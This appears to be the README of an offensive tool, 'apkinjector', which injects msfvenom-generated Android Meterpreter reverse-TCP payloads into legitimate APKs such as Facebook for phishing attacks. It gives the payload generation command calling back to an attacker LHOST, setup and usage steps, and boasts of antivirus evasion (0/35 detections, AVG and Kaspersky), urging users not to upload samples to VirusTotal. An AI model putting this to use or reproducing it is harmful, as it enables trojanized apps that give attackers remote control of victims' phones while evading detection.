# apkinjector
Android APK Antivirus evasion for msfvenom generated payloads to inject into another APK file for phishing attacks.
<br><br>
<b> -- Please do not upload "injected" files to VirusTotal.com -- </b><br>
<br>
<br>
<b>Verified automatic injection on 3/4 apps it was tested against. The automated injection on Facebook was unable to locate the .smali file to inject into. With this, I went ahead and added a manual entry for the .smali file with output to assist in finding it.</b>
<br><br>
<b>Setup:</b><br>
chmod +x apkinjector<br>
mv apkinjector /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<b>NOTE:</b> If wanting to customize each signature, then remove the keystore before running the script.<br>
<br>
<b>Usage:</b><br>
apktool \<payload>.apk \<original>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input along with an .apk you want to inject into.<br>
To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
injected_\<original>.apk<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 16Feb17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload and /tmp/original directories to see the file structure that was compiled.<br>
